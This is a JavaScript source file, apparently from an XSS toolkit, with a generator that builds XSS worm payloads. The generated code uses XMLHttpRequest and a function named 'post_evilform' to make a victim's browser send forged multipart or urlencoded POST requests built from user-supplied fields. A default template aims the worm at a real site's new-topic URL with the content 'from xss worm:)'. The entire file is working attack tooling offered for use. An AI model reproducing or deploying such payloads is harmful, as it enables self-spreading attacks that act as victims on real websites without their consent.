// JavaScript Document

knownxss.worm = {};
knownxss.worm.setWorm = function(x){
	if(x!=""){
	_g('set_Worm').disabled=true;
	var txt=_g('Ww_B_2_textarea').value;
	s=txt.split("\n");
	var yxworm="//type of form: multipart/form-data\n\n";
	yxworm += "function ajax(){\n";
	yxworm += "	var request = false;\n";
	yxworm += "	if(window.XMLHttpRequest) {\n";
	yxworm += "		request = new XMLHttpRequest();\n";
	yxworm += "	} else if(window.ActiveXObject) {\n";
	yxworm += "		var versions = [\'Microsoft.XMLHTTP\', \'MSXML.XMLHTTP\', \'Microsoft.XMLHTTP\', \'Msxml2.XMLHTTP.7.0\', \'Msxml2.XMLHTTP.6.0\', \'Msxml2.XMLHTTP.5.0\', \'Msxml2.XMLHTTP.4.0\', \'MSXML2.XMLHTTP.3.0\', \'MSXML2.XMLHTTP\'];\n";
	yxworm += "		for(var i=0; i<versions.length; i++) {\n";
	yxworm += "			try {\n";
	yxworm += "				request = new ActiveXObject(versions[i]);\n";
	yxworm += "			} catch(e) {}\n";
	yxworm += "		}\n";
	yxworm += "	}\n";
	yxworm += "	return request;\n";
	yxworm += "}\n";
	yxworm += "\n";
	yxworm += "var _x = ajax();\n";
	yxworm += "\n";
	yxworm += "post_evilform();\n";
	yxworm += "function post_evilform() {\n";
	if(x==1){
		if(s.length>1){
			for(i=0;i<s.length;i++){
				s_0_pos=s[i].indexOf("=");
				s_0=s[i].substring(0,s_0_pos);
				s_1_pos0=s[i].indexOf("\"");
				s_1_pos1=s[i].lastIndexOf("\"");
				s_1=s[i].substring(s_1_pos0,s_1_pos1+1);
				yxworm += "	" + s_0 + "=" + s_1 + ";\n";
			}
			yxworm += "	" + "argv_0=\"\\r\\n\";\n";
			for(i=1;i<s.length;i++){
				s_0_pos=s[i].indexOf("=");
				s_0=s[i].substring(0,s_0_pos);
				s_1_pos0=s[i].indexOf("\"");
				s_1_pos1=s[i].lastIndexOf("\"");
				s_1=s[i].substring(s_1_pos0,s_1_pos1+1);
				yxworm += "	" + "argv_0+=\"---------------------7964f8dddeb95fc5\\r\\nContent-Disposition: form-data; name=\\\""+s_0+"\\\"\\r\\n\\r\\n\";\n";
				yxworm += "	" + "argv_0+=("+s_0+"+\"\\r\\n\");\n";
			}
		}
		yxworm += "	" + "argv_0+=\"---------------------7964f8dddeb95fc5--\\r\\n\";\n";
		yxworm += "	" + "xhr_act(\"POST\",src,argv_0);\n";
		yxworm += "}\n";
		yxworm += "function xhr_act(_m,_s,_a){\n";
		yxworm += "	_x.open(_m,_s,false);\n";
		yxworm += "	if(_m==\"POST\")_x.setRequestHeader(\"Content-Type\",\"multipart\/form-data; boundary=-------------------7964f8dddeb95fc5\");\n";
		yxworm += "	_x.send(_a);\n";
		yxworm += "	return _x.responseText;\n";
		yxworm += "}\n";
	}else if(x==2){
		if(s.length>1){
			for(i=0;i<s.length;i++){
				s_0_pos=s[i].indexOf("=");
				s_0=s[i].substring(0,s_0_pos);
				s_1_pos0=s[i].indexOf("\"");
				s_1_pos1=s[i].lastIndexOf("\"");
				s_1=s[i].substring(s_1_pos0,s_1_pos1+1);
				yxworm += "	" + s_0 + "=" + s_1 + ";\n";
			}
			hi_yxworm = "";
			for(i=1;i<s.length;i++){
				s_0_pos=s[i].indexOf("=");
				s_0=s[i].substring(0,s_0_pos);
				s_1_pos0=s[i].indexOf("\"");
				s_1_pos1=s[i].lastIndexOf("\"");
				s_1=s[i].substring(s_1_pos0,s_1_pos1+1);
				if(i==s.length-1){hi_yxworm += "\"&"+s_0+"=\"+"+s_0+";\n";}else if(i==1) hi_yxworm+="\""+s_0+"=\"+"+s_0+"+";
				else hi_yxworm += "\"&"+s_0+"=\"+"+s_0+"+";
			}
			yxworm += "	" + "argv_0="+hi_yxworm;
		}
		yxworm += "	" + "xhr_act(\"POST\",src,argv_0);\n";
		yxworm += "}\n";
		yxworm += "function xhr_act(_m,_s,_a){\n";
		yxworm += "	_x.open(_m,_s,false);\n";
		yxworm += "	if(_m==\"POST\")_x.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");\n";
		yxworm += "	_x.send(_a);\n";
		yxworm += "	return _x.responseText;\n";
		yxworm += "}\n";
	}
	_g('Ww_B_2_textarea').value=yxworm;
	}
}
knownxss.worm.reset_Worm = function(){
	_g("Ww_B_2_textarea").value="src=\"http://www.yeeyan.com/groups/newTopic/\"\ntitle=\"xss\"\ncontent=\"from xss worm:)\"";
	if(_g('set_Worm').disabled) _g('set_Worm').disabled=false;
}